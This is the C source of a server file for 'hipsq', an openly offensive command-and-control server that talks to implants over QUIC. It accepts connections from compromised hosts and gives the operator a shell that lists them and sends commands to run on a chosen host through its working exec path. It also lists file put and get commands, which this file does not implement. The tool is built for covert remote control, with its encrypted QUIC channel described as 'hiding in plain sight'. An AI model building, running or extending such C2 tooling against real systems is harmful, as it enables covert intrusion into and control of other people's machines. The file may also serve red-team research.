/* [H]iding [I]n [P]lain [S]ight with [Q]uic
*  server.c
*  hipsq c2 server implementation
*
* Copyright 2024 Srdjan Rajcevic [www.sectreme.com]
* Parts of code Copyright (c) Microsoft Corporation.
*
* Permission is hereby granted, free of charge, to any person obtaining a copy of this software and 
* associated documentation files (the “Software”), to deal in the Software without restriction, including 
* without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell 
* copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the 
* following conditions:
*
* The above copyright notice and this permission notice shall be included in all copies or substantial 
* portions of the Software.
*
* THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT 
* LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO 
* EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER 
* IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR 
* THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/
#pragma comment(lib, "Ws2_32.lib")

#include "hipsq.h"
#include "proto.h"
#include "windows.h"
#include <winsock.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const uint16_t DefaultServerPort = 4443;
const uint64_t IdleTimeOutMs = 60000;
const uint32_t SendBufferLength = MAX_MSG_SIZE;
const QUIC_BUFFER Alpn = { sizeof("hipsq") - 1, (uint8_t*)"hipsq" };

HANDLE threadPool[MAX_THREADS];
DWORD threadIdPool[MAX_THREADS];
HIPSQ_SHELL_PARAMS threadDataPool[MAX_THREADS];
DWORD numThreads = 0;

const QUIC_API_TABLE *msQuic;
QUIC_REGISTRATION_CONFIG msQuicConfig;
HQUIC Registration, Configuration, gConnection, gStream;
QUIC_NEW_CONNECTION_INFO LastConnection;

void SprintUsage(char* argv[])
{
    printf("Usage: %s -c <cert thumbprint> [-p <server port>]\n", argv[0]);
}

void printListConnections()
{
    printf("Connections:\n");
    for (int i = 0; i < numThreads; i++)
    {
        char *remote_ip = inet_ntoa(threadDataPool[i].ConnectionInfo.RemoteAddress->Ipv4.sin_addr);
        printf("Conn #\t\tFrom\n");
        printf("[%d]\t\t%s\n", i, remote_ip);
    }
}

void printShellUsage()
{
    printf("\nhipsq C2 shell ================================================\n\n");
    printf("Available commands:\n");
    printf("quit\t\t\tExits the shell.\n");
    printf("list\t\t\tList all connections.\n");
    printf("switch <id>\t\tSwitch to connection <id>\n");
    printf("exec <command>\t\tExecutes a command on a host.\n");
    printf("put <file path>\t\tSends a file to a host.\n");
    printf("get <file path>\t\tReceives a file from a host.\n");
    printf("help\t\t\tPrints this list of available commands.\n\n");
    printf("===============================================================\n");
}


DWORD WINAPI shell(LPVOID lpShellParams)
{
    HIPSQ_SHELL_PARAMS *shParams = (HIPSQ_SHELL_PARAMS*)lpShellParams;
    DWORD t_id = shParams->ThreadId;
    HQUIC Stream = threadDataPool[t_id].Stream;
    void* Context = threadDataPool[t_id].Context;
    QUIC_STREAM_EVENT* Event = threadDataPool[t_id].Event;

    char *remote_ip = inet_ntoa(threadDataPool[t_id].ConnectionInfo.RemoteAddress->Ipv4.sin_addr);
    printShellUsage(t_id);
    char cmd[256] = {0};
    while (strncmp(cmd, "quit", sizeof("quit")) != 0) 
    {
        printf("[%d][%s]> ", t_id, remote_ip);
        gets_s(cmd, sizeof(cmd));
        parseShellCmd(cmd);
    }
    //msQuic->StreamClose(shParams->Connection.Stream, 0);
    printf("Waiting for connection. Ctrl-C to exit\n");
    return 0;
}

BOOLEAN parseArgs(int argc, char* argv[], char* certThumbprint, uint16_t* serverPort)
{
    if (argc < 3)
        return FALSE;

    if (strncmp(argv[1], "-c", 2) == 0)
    { 
        if (argv[2] != NULL && argv[3] == NULL)
        {
                certThumbprint = argv[2];
                *serverPort = DefaultServerPort;
                return TRUE;
        }

        if (argv[2] != NULL && strncmp(argv[3], "-p", 2) == 0 && argv[4] != NULL)
        {
                certThumbprint = argv[2];
                *serverPort = atoi(argv[4]);
                return TRUE;
        }
    }
    return FALSE;
}

uint8_t DecodeHexChar(char c)
{
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'A' && c <= 'F') return 10 + c - 'A';
    if (c >= 'a' && c <= 'f') return 10 + c - 'a';
    return 0;
}

uint32_t DecodeHexBuffer( const char* HexBuffer, uint32_t OutBufferLen, uint8_t* OutBuffer)
{
    uint32_t HexBufferLen = (uint32_t)strlen(HexBuffer) / 2;
    if (HexBufferLen > OutBufferLen) {
        return 0;
    }

    for (uint32_t i = 0; i < HexBufferLen; i++) {
        OutBuffer[i] =
            (DecodeHexChar(HexBuffer[i * 2]) << 4) |
            DecodeHexChar(HexBuffer[i * 2 + 1]);
    }

    return HexBufferLen;
}

void sSend(HQUIC Stream, hipsq_msg *msg)
{
    QUIC_STATUS status;
    size_t size;
    char* packed_msg = pack_raw(msg, &size); 
    QUIC_BUFFER *SendBuffer = (QUIC_BUFFER*)malloc(sizeof(QUIC_BUFFER));
    SendBuffer->Length = (uint32_t)msg->msg_size;
    SendBuffer->Buffer = (uint8_t*)packed_msg;

    if (QUIC_FAILED(status = msQuic->StreamSend(Stream, SendBuffer, 1, QUIC_SEND_FLAG_NONE, SendBuffer))) {
        puts("StreamSend failed");
        free(packed_msg);
        msQuic->StreamShutdown(Stream, QUIC_STREAM_SHUTDOWN_FLAG_ABORT, 0);
    }
}
void parseShellCmd(char* cmd)
{
    if (strncmp(cmd, "list", sizeof("list")) == 0)
        printListConnections();
    if (strncmp(cmd, "help", sizeof("help")) == 0)
        printShellUsage();
    if (strstr(cmd, "exec") != NULL)
    {
        char *cmdLine = getCmdLine(cmd);
        printf("cmd: %s\n", cmdLine);
        hipsq_msg execMsg;
        execMsg.proto_id = HIPSQ_PROTO_ID;
        execMsg.payload_id = HIPSQ_PAYLOAD_ID_EXEC;
        execMsg.payload = cmdLine;
        execMsg.msg_size = sizeof(execMsg.msg_size) + sizeof(execMsg.payload_id) 
                    + strlen(execMsg.payload) + 1 + strlen(execMsg.proto_id) + 1;
        
        sSend(gStream, &execMsg);

    }
}

_IRQL_requires_max_(DISPATCH_LEVEL) _Function_class_(QUIC_STREAM_CALLBACK)
QUIC_STATUS QUIC_API
StreamCB(_In_ HQUIC Stream, _In_opt_ void* Context, _Inout_ QUIC_STREAM_EVENT* Event)
{
    gStream = Stream;
    (void) Context;
    switch (Event->Type) {
        case QUIC_STREAM_EVENT_SEND_COMPLETE:
            //printf("[str][%p] send complete.\n", Stream);
            free(Event->SEND_COMPLETE.ClientContext);
            break;
        case QUIC_STREAM_EVENT_RECEIVE:
            //printf("[str][%p] received %d bytes.\n", Stream, (uint32_t)Event->RECEIVE.TotalBufferLength);
            hipsq_msg unpacked_msg;
            if(!unpack_raw((char*)Event->RECEIVE.Buffers->Buffer, &unpacked_msg)) {
                printf("[str][%p] unknown message\n", Stream);
                break; // drop non-hipsq message
            }
            else {
                    switch(unpacked_msg.payload_id) {
                        case HIPSQ_PAYLOAD_ID_INIT:
                            printf("[str][%p] HIPSQ INIT from %s\n", Stream, inet_ntoa(LastConnection.RemoteAddress->Ipv4.sin_addr));
                            HIPSQ_SHELL_PARAMS *sParams = (HIPSQ_SHELL_PARAMS*)malloc(sizeof(HIPSQ_SHELL_PARAMS));
                            sParams->ThreadId = numThreads;
                            sParams->ConnectionInfo = LastConnection;
                            sParams->Stream = Stream;
                            sParams->Context = Context;
                            sParams->Event = Event;
                            threadPool[numThreads] = CreateThread(NULL, 0, shell, sParams, 0, &threadIdPool[numThreads]);
                            threadDataPool[numThreads] = *sParams;
                            numThreads++;
                            //WaitForSingleObject(threadPool[numThreads - 1], INFINITE);
                            break;
                        default:
                            // printf("[str][%p] msg_size: %d | proto_id: %s | payload_id: %d | payload: %s\n", 
                            //         Stream, unpacked_msg.msg_size, unpacked_msg.proto_id, unpacked_msg.payload_id, 
                            //         unpacked_msg.payload);
                            break;
                    }       
                }
            break;
        case QUIC_STREAM_EVENT_PEER_SEND_SHUTDOWN:
            //printf("[str][%p] peer send shutdown.\n", Stream);
            break;
        case QUIC_STREAM_EVENT_PEER_SEND_ABORTED:
            //printf("[str][%p] peer send aborted.\n", Stream);
            msQuic->StreamShutdown(Stream, QUIC_STREAM_SHUTDOWN_FLAG_ABORT, 0);
            break;
        case QUIC_STREAM_EVENT_SHUTDOWN_COMPLETE:
            //printf("[str][%p] shutdown complete.\n", Stream);
            msQuic->StreamClose(Stream);
            break;
        default:
            break;
    }
    return QUIC_STATUS_SUCCESS;
}
_IRQL_requires_max_(DISPATCH_LEVEL) _Function_class_(QUIC_CONNECTION_CALLBACK)
QUIC_STATUS QUIC_API
ConnectionCB(_In_ HQUIC Connection, _In_opt_ void* Context, _Inout_ QUIC_CONNECTION_EVENT* Event)
{   
    gConnection = Connection;
    (void) Context;
    switch (Event->Type)
    {
        case QUIC_CONNECTION_EVENT_CONNECTED:
            printf("[conn][%p] connect.\n", Connection);
            msQuic->ConnectionSendResumptionTicket(Connection, QUIC_SEND_RESUMPTION_FLAG_NONE, 0, NULL);
            break;
        case QUIC_CONNECTION_EVENT_SHUTDOWN_COMPLETE:
            msQuic->ConnectionClose(Connection);
            printf("[conn][%p] shutdown complete.\n", Connection);
            break;
        case QUIC_CONNECTION_EVENT_SHUTDOWN_INITIATED_BY_TRANSPORT:
            if (Event->SHUTDOWN_INITIATED_BY_TRANSPORT.Status == QUIC_STATUS_CONNECTION_IDLE) {
                printf("[conn][%p] successfully shut down on idle.\n", Connection);
            } else {
                printf("[conn][%p] shut down by transport, 0x%x\n", Connection, Event->SHUTDOWN_INITIATED_BY_TRANSPORT.Status);
            }
            break;
        case QUIC_CONNECTION_EVENT_SHUTDOWN_INITIATED_BY_PEER:
            printf("[conn][%p] shut down by peer, 0x%llu\n", Connection, (unsigned long long)Event->SHUTDOWN_INITIATED_BY_PEER.ErrorCode);
            break;
        case QUIC_CONNECTION_EVENT_PEER_STREAM_STARTED:
            printf("[conn][%p] peer started the stream\n", Event->PEER_STREAM_STARTED.Stream);
            msQuic->SetCallbackHandler(Event->PEER_STREAM_STARTED.Stream, (void*)StreamCB, NULL);
            break;
        case QUIC_CONNECTION_EVENT_RESUMED:
            printf("[conn][%p] resumed.\n", Connection);
            break;
        default:
            break;
    }
    return QUIC_STATUS_SUCCESS;
}
_IRQL_requires_max_(PASSIVE_LEVEL) _Function_class_(QUIC_LISTENER_CALLBACK)
QUIC_STATUS QUIC_API
ListenerCB(_In_ HQUIC Listener, _In_opt_ void* Context, _Inout_ QUIC_LISTENER_EVENT* Event)
{
    (void) Context, Listener;
    QUIC_STATUS status = QUIC_STATUS_NOT_SUPPORTED;
    switch(Event->Type) {
        case QUIC_LISTENER_EVENT_NEW_CONNECTION:
            msQuic->SetCallbackHandler(Event->NEW_CONNECTION.Connection, (void*)ConnectionCB, NULL);
            status = msQuic->ConnectionSetConfiguration(Event->NEW_CONNECTION.Connection, Configuration);
            LastConnection = *Event->NEW_CONNECTION.Info;
            break;
        default:
            break;
    }
    return status;
}

int main(int argc, char* argv[])
{
    char *certThumbprint = NULL;
    uint16_t serverPort;

    if (!parseArgs(argc, argv, certThumbprint, &serverPort))
    {
        SprintUsage(argv);
        return 0;
    }

    QUIC_STATUS status = QUIC_STATUS_SUCCESS;
    if (QUIC_FAILED(status = MsQuicOpen2(&msQuic)))
    {
        puts("Failed to initialize MsQuic");
        goto error;
    }

    msQuicConfig.AppName = "hipsq_server";
    msQuicConfig.ExecutionProfile = QUIC_EXECUTION_PROFILE_LOW_LATENCY;

    if (QUIC_FAILED(status = msQuic->RegistrationOpen(&msQuicConfig, &Registration)))
    {
        puts("Failed to open registration");
        goto error;
    }

    HQUIC Listener = NULL;

    QUIC_ADDR Address = {0};
    QuicAddrSetFamily(&Address, QUIC_ADDRESS_FAMILY_INET);
    QuicAddrSetPort(&Address, serverPort);

    QUIC_SETTINGS Settings = {0};
    Settings.IdleTimeoutMs = IdleTimeOutMs;
    Settings.IsSet.IdleTimeoutMs = TRUE;
    Settings.ServerResumptionLevel = QUIC_SERVER_RESUME_AND_ZERORTT;
    Settings.IsSet.ServerResumptionLevel = TRUE;
    Settings.PeerBidiStreamCount = 1;
    Settings.IsSet.PeerBidiStreamCount = TRUE;

    QUIC_CREDENTIAL_CONFIG_HELPER Config;
    memset(&Config, 0, sizeof(Config));
    Config.CredConfig.Flags = QUIC_CREDENTIAL_FLAG_NONE;

    uint32_t CertHashLen = DecodeHexBuffer(argv[2], sizeof(Config.CertHash.ShaHash), Config.CertHash.ShaHash);
        if (CertHashLen != sizeof(Config.CertHash.ShaHash)) {
            puts("Failed to parse cert hash");
            goto error;
        }
        Config.CredConfig.Type = QUIC_CREDENTIAL_TYPE_CERTIFICATE_HASH;
        Config.CredConfig.CertificateHash = &Config.CertHash;
    
    if (QUIC_FAILED(status = msQuic->ConfigurationOpen(Registration, &Alpn, 1, &Settings, sizeof(Settings), NULL, &Configuration))) {
        puts("Failed to open configuration");
        goto error;
    }
    if (QUIC_FAILED(status = msQuic->ConfigurationLoadCredential(Configuration, &Config.CredConfig))) {
        puts("Failed to load credential");
        goto error;
    }
    if (QUIC_FAILED(status = msQuic->ListenerOpen(Registration, ListenerCB, NULL, &Listener))) {
        puts("Failed to open listener");
        goto error;
    }
    if (QUIC_FAILED(status = msQuic->ListenerStart(Listener, &Alpn, 1, &Address))) {
        puts("Failed to start listener");
        goto error;
    }

    printf("\n|\\     /|\\__   __/(  ____ )(  ____ \\(  ___  )\n");
    printf("| )   ( |   ) (   | (    )|| (    \\/| (   ) | Hiding\n");
    printf("| (___) |   | |   | (____)|| (_____ | |   | | In\n");
    printf("|  ___  |   | |   |  _____)(_____  )| |   | | Plain\n");
    printf("| (   ) |   | |   | (            ) || | /\\| | Sight\n");
    printf("| )   ( |___) (___| )      /\\____) || (_\\ \\ | with QUIC\n");
    printf("|/     \\|\\_______/|/       \\_______)(____\\/_)\n");
    printf("by Srdjan Rajcevic of SECTREME\n");
    printf("\n\nListening on port %d...\n", serverPort);
    printf("Waiting for connection. Ctrl-C to exit\n");
    
    while(1) {
        
    }
    return 0;
    error:
    if (Listener != NULL)
        msQuic->ListenerClose(Listener);
    if (Configuration != NULL)
        msQuic->ConfigurationClose(Configuration);
    if (Registration != NULL)
        msQuic->RegistrationClose(Registration);
    
    MsQuicClose(&msQuic);
    return 1;
}